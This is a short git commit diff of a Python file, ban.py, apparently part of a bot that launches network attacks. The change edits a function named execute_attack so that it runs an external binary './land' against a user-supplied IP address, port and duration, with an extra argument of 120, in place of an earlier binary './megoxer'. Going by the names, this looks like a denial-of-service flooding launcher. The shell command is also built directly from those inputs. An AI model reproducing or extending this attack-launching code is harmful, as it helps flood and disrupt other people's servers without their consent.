3a34c9380af7e6238f674c0a2ab041ffa4d6be5a
Titan637 <aliabbas729@hotmail.com>
2025-02-05 09:17:51 +0530

    Update ban.py

--- ban.py
+++ ban.py
@@ -241,7 +241,7 @@ async def execute_attack(ip, port, duration, username):
     try:
         # Start the attack process
         proc = await asyncio.create_subprocess_shell(
-            f"./megoxer {ip} {port} {duration}",
+            f"./land {ip} {port} {duration} 120",
             stderr=asyncio.subprocess.PIPE
         )
 
